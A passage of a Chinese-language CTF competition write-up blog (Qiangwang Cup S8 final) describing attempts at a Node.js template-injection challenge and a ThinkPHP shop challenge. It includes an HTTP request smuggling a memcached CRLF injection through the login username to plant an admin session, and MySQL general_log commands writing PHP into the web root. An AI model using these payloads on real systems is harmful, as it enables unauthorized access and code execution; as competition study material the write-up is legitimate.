n><span></span><span></span></span></code></pre>

<p>同样的方法用 &#x2F;readflag 读取flag即可</p>
<hr>
<h2 id="anniversary（0-Solved）"><a href="#anniversary（0-Solved）" class="headerlink" title="anniversary（0 Solved）"></a>anniversary（0 Solved）</h2><p><img src="/blog/2024/12/05/%E5%BC%BA%E7%BD%91%E6%9D%AFS8-Final/image-20241206100717732.png" alt="image-20241206100717732"></p>
<p><img src="/blog/2024/12/05/%E5%BC%BA%E7%BD%91%E6%9D%AFS8-Final/image-20241206101144441.png" alt="image-20241206101144441"></p>
<p>观察渲染格式，这里是<code>方法 参数</code>的形式</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token literal-property property">text</span><span class="token operator">:</span> <span class="token string">'距离纪念日还有 &#123;&#123;anniversary_time_diff t=1736006400000 l=\"cn\"&#125;&#125;'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>测试报错：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">Error<span class="token punctuation">:</span> Invalid time value

TypeError<span class="token punctuation">:</span> Cannot destructure <span class="token builtin">property</span> <span class="token string">'hash'</span> of <span class="token string">'arguments[0]'</span> <span class="token keyword">as</span> it <span class="token keyword">is</span> undefined<span class="token punctuation">.</span>
TypeError<span class="token punctuation">:</span> Cannot destructure <span class="token builtin">property</span> <span class="token string">'t'</span> of <span class="token string">'hash'</span> <span class="token keyword">as</span> it <span class="token keyword">is</span> undefined<span class="token punctuation">.</span>

RangeError<span class="token punctuation">:</span> Invalid time value<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>hint：</p>
<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">提示：
1. 尝试探测服务端渲染模版的组件及其版本
2. anniversary_time_diff无法利用
3. 尝试发现其他模版可以访问的函数/变量
4. 尝试利用模版渲染组件本身的漏洞实现RCE
5. 尝试类型混淆<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>测不出来，什么nodejs模板会只渲染<code>&#123;&#123;&#125;&#125;</code>，<code>[]</code>能返回一个 object 啊</p>
<br>

<p>可能的模板：</p>
<p>Handlebars：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/4327">https://xz.aliyun.com/news/4327</a></p>
<hr>
<h1 id="RW"><a href="#RW" class="headerlink" title="RW"></a>RW</h1><h2 id="TS-（Unsolved）"><a href="#TS-（Unsolved）" class="headerlink" title="TS++（Unsolved）"></a>TS++（Unsolved）</h2><p>thinkshop 还在追我</p>
<p>和 thinkshopping 一样的操作打 memcached 进后台</p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/public/index.php/index/admin/do_login.html</span> <span class="token http-version property">HTTP/1.1</span></span>
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">localhost:36000</span></span>
<span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0</span></span>
<span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate, br</span></span>
<span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span>
<span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">PHPSESSID=gan31bc5bm4k4jn9v7npb878g6</span></span>
<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/x-www-form-urlencoded</span></span>
<span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">255</span></span>

username=admin%00%0D%0Aset%20think%3Ashop.admin%7Cadmin%204%20500%20101%0D%0Aa%3A3%3A%7Bs%3A2%3A%22id%22%3Bi%3A1%3Bs%3A8%3A%22username%22%3Bs%3A5%3A%22admin%22%3Bs%3A8%3A%22password%22%3Bs%3A32%3A%2221232f297a57a5a743894a0e4a801fc3%22%3B%7D&amp;password=admin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这样子账密 admin:admin 进后台</p>
<p>但是 secure_file_priv 为 <code>/var/lib/mysql-files/</code>，不能读文件了</p>
<p>总之 diff 看一下和上一代比有哪些变化吧</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">diff</span> <span class="token parameter variable">-rq</span> web1 web2
Files web1/application/index/model/Goods.php and web2/application/index/model/Goods.php differ
Files web1/application/index/view/admin/goods_add.html and web2/application/index/view/admin/goods_add.html differ
Files web1/application/index/view/admin/goods_edit.html and web2/application/index/view/admin/goods_edit.html differ
Files web1/application/index/view/index/goods.html and web2/application/index/view/index/goods.html differ<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>对比了一下，goods_edit.html 和 goods.html 里多了个 base64 解码，Goods.php 删掉了后面一串用不上的代码</p>
<p>sql 里仍有<code>(1, &#39;admin&#39;, &#39;e10adc3949ba59abbe56e057f20f883e&#39;);</code>，也就是说可以<code>1:123456</code>进后台</p>
<p>那么唯一的问题就是我们现在只有sql注入，写不了shell</p>
<p>感觉还是要从 memcached CRLF 入手</p>
<p>尝试写日志</p>
<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">show variables like &#39;%general%&#39;;
set global general_log &#x3D; on;
set global general_log_file &#x3D; &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;public&#x2F;info.php&#39;;
select &#39;&lt;?php phpinfo();?&gt;&#39;;	<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>本地容器终端上测试能写，但是权限不够访问，遂放弃注入</p>
<p>最后想了下，既然我们能往 memcached 里面写入序列化字符串，那么也可以直接把 poc 的序列化字符串进行反序列化</p>
<p>然后就搜到了这个：<a target="_blank" rel="noopener" href="https://zhcy2018.github.io/2023/%E5%BC%BA%E7%BD%91%E6%9D%AF%20thinkshopping.html">https://zhcy2018.github.io/2023/%E5%BC%BA%E7%BD%91%E6%9D%AF%20thinkshopping.html</a></p>
<p>但是来不及了，没来得及多研究就架上台去尝试了，然后翻车了XD</p>
<hr>
<h1 id="游记（to-be-continued）"><a href="#游记（to-be-continued）" class="headerlink" title="游记（to be continued）"></a>游记（to be continued）</h1><p>三天的强网梦结束了，归来依旧是个臭双非的学生，写个锤子游记，ddl赶不完了，等肝完ddl再说 —— 2024.12.8</p>

    </div>
    
    
    
    
    
    
    
</div>

            </div>
        </transition>
        
        <transition name="fade">
            <div id="preview" ref="preview" v-show="previewShow">
                <img id="preview-content" ref="previewContent" />
            </div>
        </transition>
        
    </div>
    <script src="/blog/js/main.js"></script>
    
    




    
    

<div id="vcomments"></div>

<script src="/blog/js/lib/valine.min.js"></script>
<script>
    new Valine({
        el: '#vcomments',
        app_id: 'U9mZLKunkRUTcBFthjXPjnZE-9Nh9j0Va',
        app_key: 'SzWOnY0PWLGNuL6jW8TZYc7j',
        visitor: 'true',
        placeholder: '写点什么吧(●ˇ∀ˇ●)',
        serverURLs: 'https://u9mzlkun.lc-cn-n1-shared.com',
    });
</script>

    <footer id="footer">
    <div id="footer-wrap">
        <div>
            &copy;
            2022 - 2025 雲流のLowest World
            <span id="footer-icon">
                <i class="fa-solid fa-font-awesome fa-fw"></i>
            </span>
            &commat;C1oudfL0w0
        </div>
        <div>
            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
            <a target="_blank" rel="noopener" href="https://github.com/argvchs/hexo-theme-particlex">ParticleX Theme</a>
        </div>
        
    </div>
</footer>

<script src="/blog/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/blog/live2dw/assets/z16.model.json"},"display":{"position":"left","width":150,"height":290},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>

</html>